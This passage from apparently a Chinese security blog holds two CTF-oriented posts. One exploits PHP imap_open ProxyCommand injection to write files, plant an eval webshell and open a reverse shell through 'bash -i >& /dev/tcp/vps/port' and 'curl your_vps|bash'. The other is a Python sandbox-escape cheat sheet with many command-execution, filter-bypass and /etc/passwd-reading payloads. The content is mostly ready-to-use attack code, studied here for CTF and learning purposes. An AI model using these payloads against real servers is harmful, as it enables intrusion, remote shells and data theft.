<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$payload = <span class="string">"echo lihuaiqiu|tee /tmp/success"</span>;$encoded_payload = base64_encode($payload);$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>

<p>运行回显如下：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/nb9t3kbucc.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>我们通过构造恶意服务器参数，成功的建立了我们想要的文件，通过此功能我们可以写webshell达到我们想要目的。</p>
<h3 id="Bypass-disable-functions"><a href="#Bypass-disable-functions" class="headerlink" title="Bypass disable_functions"></a><strong>Bypass disable_functions</strong></h3><p>理解了这个漏洞的原理，我们就能知道这个功能是可以bypass disable_functions的。</p>
<p>下面来具体分析一下：</p>
<p>在存在RFI或LFI的情况下：</p>
<p>我们通过imap_open建立一个内容为\的1.php</p>
<p>运行脚本如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$server = <span class="string">"any -o ProxyCommand=echo\t'\&lt;?php\tsystem(whoami);?&gt;'\t&gt;\t1.php"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>

<p>存在RFI漏洞文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以控制$file参数为我们刚才设置的1.php</p>
<p>回显结果：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/39443ngokr.jpeg?imageView2/2/w/1620" alt="img"></p>
<h3 id="安恒二月赛场景分析"><a href="#安恒二月赛场景分析" class="headerlink" title="安恒二月赛场景分析"></a><strong>安恒二月赛场景分析</strong></h3><p>由于没有环境，只能分析一下关键部分的思路</p>
<p>本题同样为imap_open所产生的漏洞.关键部分的在于对base64以及|的过滤，但是这个是存在上传图片的地方，所以我们可以通过bash+图片名来执行我们想要的命令</p>
<p>本地代码复现:</p>
<p>运行脚本如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php$server = <span class="string">"any -o ProxyCommand=bash\t1.jpg"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>

<p>1.jpg内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo&quot;&lt;?php @eval($_POST[&#39;li&#39;]);?&gt;&quot;&gt;webshell.php</span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<p><img src="https://ask.qcloudimg.com/http-save/5426480/vcfnmspuo2.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>成功的打出webshell.</p>
<p><strong>另一个思考：</strong></p>
<p>如果这道题没有上传文件的助攻该怎么办？</p>
<p>其实在上面我们可以看见，这个是有建立文件的功能的，所以我们可以根据hitcon的一道题的思路：</p>
<p>先建立我们所需要的文件名，比如文件名最后需要的是 <code>curl your_vps|bash</code>，在文件的index.html中写入反弹bash的一句话：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/vps/port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>通过建立如下文件名</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">'\&gt;sh\ '</span></span><br><span class="line"><span class="string">'&gt;ba\\\\\'</span></span><br><span class="line"><span class="string">'</span>&gt;\\\|\\\\<span class="string">'</span></span><br><span class="line"><span class="string">中间省略一些建立ip的过程</span></span><br><span class="line"><span class="string">'</span>&gt;rl\\\\<span class="string">'</span></span><br><span class="line"><span class="string">'</span>&gt;cu\\\\<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>最后通过命令ls -t&gt;g将文件名导入g中，执行命令sh g，最终反弹shell。</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Python沙箱逃逸</title>
    <url>/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本来计划两天内出完这篇<code>Blog</code>的，结果被<code>mfc</code>小学期以及想玩的心态拖着.(拖到了6天),接下来要加把劲啊！</p>
<h3 id="python沙箱逃逸介绍"><a href="#python沙箱逃逸介绍" class="headerlink" title="python沙箱逃逸介绍"></a>python沙箱逃逸介绍</h3><p><code>python</code>沙箱逃逸用于一些沙箱环境(如被禁止掉关键系统函数的<code>python</code>环境)，如一些<code>OJ</code>网站或者<code>jinja2</code>这类模板解释器。而沙箱逃逸的目的则是绕过对关键系统函数的限制，在对方服务器上运行我们的恶意代码，甚至<code>getshell</code>。</p>
<h3 id="Python中可执行代码命令的模板以及函数"><a href="#Python中可执行代码命令的模板以及函数" class="headerlink" title="Python中可执行代码命令的模板以及函数"></a>Python中可执行代码命令的模板以及函数</h3><ul>
<li><code>os</code>模块</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>exec</code>代码执行</li>
</ul>
<p><code>exec(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</code></p>
<ul>
<li><code>eval</code>代码执行</li>
</ul>
<p><code>eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</code></p>
<ul>
<li>利用<code>timeit</code>模块与<code>timeit</code>函数</li>
</ul>
<p><code>timeit</code>函数介绍:计算一小段<code>python</code>代码的执行时间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('ls')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>platform</code>模块</li>
</ul>
<p><code>platform</code>模板可以提供很多方法去获取目标系统的操作信息，如<code>platform.system</code>等函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>commands</code>模块</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line">commands.getoutput(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">commands.getstatusoutpur(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>subprocess</code>模块</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">subprocess.call([<span class="string">'whoami'</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>types</code>模块和<code>FileType</code>函数进行文件读取</li>
</ul>
<p><code>types</code>模块定义了<code>python</code>的很多类型，其中<code>FileType</code>函数可以用来打开文件进行文件读取.</p>
<p><img src="https://s2.ax1x.com/2019/07/05/ZajKEQ.png" alt="ZajKEQ.png"></p>
<ul>
<li>其他文件读取操作</li>
</ul>
<p><code>file(&#39;xxx.txt&#39;).read()</code></p>
<p><code>open(&#39;xxx.txt&#39;).read()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">codecs.open(<span class="string">'xxx.txt'</span>).read()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>f修饰符</code>进行命令执行</li>
</ul>
<p>此命令执行方法只限于<code>python3.6</code>以上的版本</p>
<p>用法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">f'<span class="subst">&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="string">f'<span class="subst">&#123;open(<span class="string">'xxx.txt'</span>).read()&#125;</span>'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>动态加载类和函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="花式命令执行绕过逃逸"><a href="#花式命令执行绕过逃逸" class="headerlink" title="花式命令执行绕过逃逸"></a>花式命令执行绕过逃逸</h3><h4 id="dict-与dir-函数"><a href="#dict-与dir-函数" class="headerlink" title="__dict__与dir()函数"></a><code>__dict__</code>与<code>dir()</code>函数</h4><h5 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a><code>dir()</code>函数</h5><p><img src="https://s2.ax1x.com/2019/07/05/Zdinbt.png" alt="Zdinbt.png"></p>
<p>先看一下简单的介绍，简单来讲<code>dir()</code>函数就是：<strong>无参数时，返回当前范围内的变量，方法等，有参数时，返回参数的属性方法等</strong></p>
<p>通过<code>dir(__builtins__)</code>可以查看所有内置函数以及私有属性,不过在<code>python3</code>中<code>builtins</code>是一个模块，需要先进行<code>import</code>再进行<code>dir</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, &#39;AttributeError&#39;, &#39;BaseException&#39;, &#39;BufferError&#39;, &#39;BytesWarning&#39;, &#39;DeprecationWarning&#39;, &#39;EOFError&#39;, &#39;Ellipsis&#39;, &#39;EnvironmentError&#39;, &#39;Exception&#39;, &#39;False&#39;, &#39;FloatingPointError&#39;, &#39;FutureWarning&#39;, &#39;GeneratorExit&#39;, &#39;IOError&#39;, &#39;ImportError&#39;, &#39;ImportWarning&#39;, &#39;IndentationError&#39;, &#39;IndexError&#39;, &#39;KeyError&#39;, &#39;KeyboardInterrupt&#39;, &#39;LookupError&#39;, &#39;MemoryError&#39;, -ge&#39;, &#39;raw_input&#39;, &#39;reduce&#39;, &#39;reload&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;unichr&#39;, &#39;unicode&#39;, &#39;vars&#39;, &#39;xrange&#39;, &#39;zip&#39;]</span><br></pre></td></tr></table></figure>

<p>可以看出平时我们所有的<code>chr,open</code>等函数其实就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtin__.open()</span><br><span class="line"></span><br><span class="line">__builtin__.chr()</span><br></pre></td></tr></table></figure>

<p>我们还可以通过<code>open</code>函数进行敏感文件读取</p>
<p><code>__builtins__.open(&#39;/etc/passwd&#39;).read()</code></p>
<h5 id="dict-方法"><a href="#dict-方法" class="headerlink" title="__dict__方法"></a><code>__dict__</code>方法</h5><p><code>dict</code>与<code>dir()</code>都是都是列出一个<strong>模板/类/对象</strong>下面所有的<strong>属性和函数</strong>，下面两句是等价的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> __builtins__.__dict__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">__builtins__.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>不过..这有什么用呢(<strong>当然是回到最初的起点考虑—–&gt;绕过</strong>),通过<code>__dict__</code>,即便过滤了<code>import</code>，我们完全可以通过<code>base64</code>编码加<code>__dict__</code>进行一波绕过</p>
<p><code>payload</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="importlib动态导入模块命令执行"><a href="#importlib动态导入模块命令执行" class="headerlink" title="importlib动态导入模块命令执行"></a><code>importlib</code>动态导入模块命令执行</h4><h5 id="无绕过payload"><a href="#无绕过payload" class="headerlink" title="无绕过payload"></a>无绕过payload</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="绕过payload"><a href="#绕过payload" class="headerlink" title="绕过payload"></a>绕过payload</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="getattr-和-getattribute"><a href="#getattr-和-getattribute" class="headerlink" title="__getattr__和__getattribute__"></a><strong><code>__getattr__</code></strong>和<code>__getattribute__</code></h4><p>其实这里最常用的是<code>__getattribute__</code>，当我们构造的如下继承链(后面会说明)，遭到了关键性名词的过滤，如下面的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>如果这里过滤了<code>ls</code>命令,那么<code>func_globals</code>以及<code>__globals__</code>都无法使用，我们就可以使用<code>__getattribute__</code>进行绕过，两个魔法函数用法定义如下：</p>
<ol>
<li>如果在类中定义了<code>__getattr__()</code>这个方法，那么在对象查询属性时,如果这个属性在类中定义了，如一个已经实例化的对象x定义了属性name，那么在使用x.name时就不会调用<code>__getattr__(</code>name<code>)</code>；会直接返回name已经定义好的值。简单的说：<code>__getattr__()</code>会在对象中不存在这个属性时被调用。</li>
<li>如果在类定义了<code>__getattribute__()</code>方法，那么它无条件被调用。当实例化的对象每次引用属性和方法时都会先调用它。如果属性查找不到那么就会引发<code>AttributeError</code>的异常。除非在类中同时定义了<code>__getattribute__()</code>和<code>__getattr__()</code>两个方法。</li>
</ol>
<p>所以最终的绕过payload为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure>

<p>利用调用属性<code>func_globals</code>(其实就是<code>__globals__</code>)(<strong>利用func_globals可以返回对应类的所有调用基类与函数</strong>)，最终绕过过滤。</p>
<p>其实<code>__getattribute__</code>与<code>__getattr__</code>不仅只支持对象，<code>module</code>也是支持的，这是郁师傅文章中的两个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>虽然<code>__import__(&#39;os&#39;)__</code>是一个模板，<strong>但是也可以通过<code>__getattribute__</code>去调用属性，判断我们的属性是否存在，这里我们调用其实是<code>system</code>，所以属性存在，直接返回原来的属性system，完成系统命令执行。</strong></p>
<h4 id="花式重载以及引入"><a href="#花式重载以及引入" class="headerlink" title="花式重载以及引入"></a>花式重载以及引入</h4><h5 id="引入模块路径"><a href="#引入模块路径" class="headerlink" title="引入模块路径"></a>引入模块路径</h5><p>当一个沙箱环境中缺少了<code>os</code>等模块，如通过代码<code>sys.modules[&#39;os&#39;]=None</code>将<code>os</code>模块限制，但是我们还可以通过路径引入，在<code>linux</code>环境下，os模块的默认路径为<strong>usr/lib/python2.7/os.py</strong>,我们可以再次通过引入<code>os</code>模块路径，再次进行命令执行。代码测试如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">'os'</span>]=<span class="literal">None</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line">sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.py'</span></span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>

<p>成功在os模块被限制的情况下成功进行了引入。</p>
<h5 id="reload方法进行重载"><a href="#reload方法进行重载" class="headerlink" title="reload方法进行重载"></a>reload方法进行重载</h5><p>在python中，不用引入直接使用的内置函数为<code>builtin</code>函数，随着<code>__builtins__</code>模板自动引入当前华，在前面我们也说过<code>chr()</code>函数其实相当于<code>__builtin__.chr()</code>,但是如果我们把这些函数从<code>__builtin__</code>中删除，就再也无法调用这些函数了。如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">del</span> __builtins__.chr</span><br><span class="line">chr(<span class="number">97</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"> reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line"><span class="string">'a'</span></span><br></pre></td></tr></table></figure>

<p>同样，如果在<code>__builtins__</code>删除掉了<code>__import__</code>,<code>eval</code>,<code>execfile</code>等函数，那么我们就无法进行危险函数调用了，所以这里可以通过<code>reload</code>再次将所有危险方法重载一次。<strong>但是reload也是<code>__builtin__</code>下面的函数，如果将reload过滤掉，我们就没法重载了，但是,python中还有一个模块叫做<code>imp</code>,是一个与引入相关的模块，通过如下代码，我们可以再次引入。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">del</span> __builtins__.chr</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"> <span class="keyword">import</span> imp</span><br><span class="line"> imp.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line"><span class="string">'a'</span></span><br></pre></td></tr></table></figure>

<p>同样在没过滤<code>execfile</code>函数的情况下，还可以通过<code>execfile</code>进行加载模板文件.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</span><br><span class="line"></span><br><span class="line">system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="引入objecb命令执行"><a href="#引入objecb命令执行" class="headerlink" title="引入objecb命令执行"></a>引入objecb命令执行</h4><p>这里自己踩了几个定义不清晰的坑点，也来说一下。</p>
<p><code>python</code>的<code>object</code>类中集成了很多基础函数，在我们想调用这些函数也是通过调用<code>object</code>去操作的,而<code>object类</code>主要通过<code>__mro__</code>和<code>__bases__</code>两种方式来创建，如下是创建方法</p>
<p>首先大概看一下这个两个<code>tuple</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__</span><br><span class="line">(&lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'object'</span>&gt;)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>所以创建一个<code>object</code>大概有如下几种方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>这里再来介绍一下常见的一些属性，可以更好的理解构造的<strong>命令执行继承链条</strong></p>
<h5 id="bases-属性"><a href="#bases-属性" class="headerlink" title="__bases__属性"></a><code>__bases__</code>属性</h5><p>返回一个类所继承的类，返回的是元组形式。`</p>
<h5 id="class-返回一个实例所属的类"><a href="#class-返回一个实例所属的类" class="headerlink" title="__class__返回一个实例所属的类"></a><code>__class__</code>返回一个实例所属的类</h5><p>返回一个实例所属的类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lihuaiqiu</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">huai=lihuaiqiu()</span><br><span class="line"><span class="keyword">print</span> huai.__class__</span><br></pre></td></tr></table></figure>

<p>最终返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__main__.lihuaiqiu</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.3</span>s]</span><br></pre></td></tr></table></figure>

<h5 id="globals-属性"><a href="#globals-属性" class="headerlink" title="__globals__属性"></a><code>__globals__</code>属性</h5><p>只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量。如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>功能等同于<code>func_globals</code>，如下两个<code>payload</code>等价</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="subclasses-属性"><a href="#subclasses-属性" class="headerlink" title="__subclasses__属性"></a><code>__subclasses__</code>属性</h5><p>以dict形式返回当前类的所有子类。</p>
<h5 id="构造继承链绕过沙箱"><a href="#构造继承链绕过沙箱" class="headerlink" title="构造继承链绕过沙箱"></a>构造继承链绕过沙箱</h5><p>首先起手式肯定是先去构造<code>object</code>类，这个在前面写了几种构造方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>通过<code>payload:().__class__.__base__.__subclasses__()</code>等列出所有子类，在所有子类中寻找可以进一步利用的危险操作。</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Zw8qtU.png" alt="Zw8qtU.png"></p>
<p>在这里可以看到<code>&lt;type &#39;file&#39;&gt;</code>这个<code>file</code>对象，进一步通过<code>dir()</code>函数查看有没有什么可以利用的危险函数方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, _<span class="string">', '</span>__init__<span class="string">', '</span>__iter__<span class="string">', '</span>__new__<span class="string">', '</span>__reduce__<span class="string">', '</span>__reduce_ex__<span class="string">', '</span>__repr__<span class="string">', '</span>__setattr__<span class="string">', '</span>__<span class="string">', '</span>__str__<span class="string">', '</span>__subclasshook__<span class="string">', '</span>close<span class="string">', '</span>closed<span class="string">', '</span>encoding<span class="string">', '</span>errors<span class="string">', '</span>fileno<span class="string">', '</span>flush<span class="string">', '</span>isaode<span class="string">', '</span>name<span class="string">', '</span>newlines<span class="string">', '</span>next<span class="string">', '</span>read<span class="string">', '</span>readinto<span class="string">', '</span>readline<span class="string">', '</span>readlines<span class="string">', '</span>seek<span class="string">', '</span>softspace<span class="string">', '</span>truncate<span class="string">', '</span>write<span class="string">', '</span>writelines<span class="string">', '</span>xreadlines<span class="string">']</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到是有<code>文件读写函数</code>的，所以可以通过<code>().__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code>这样的payload进行读取敏感文件数据等价于<code>file(&#39;/etc/passwd&#39;).read()</code></p>
<p>那么通过这个思路:先找到<code>object</code>的所有子类，再去找有危险操作的子类,这里的子类中是有两种类型的<code>type</code>与<code>class</code>，<code>class</code>最好配置<code>__init__</code>初始化再进行<code>__globals__</code>更好的寻找危险利用点。这里总结一下常用的<code>payload</code>。</p>
<h5 id="读文件-写文件"><a href="#读文件-写文件" class="headerlink" title="读文件/写文件"></a>读文件/写文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read() </span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/flag'</span>, <span class="string">'w'</span>).write(<span class="string">'flag&#123;sandbox_is_so_cool&#125;'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#也是载入__builtins__</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls"))</span></span><br></pre></td></tr></table></figure>

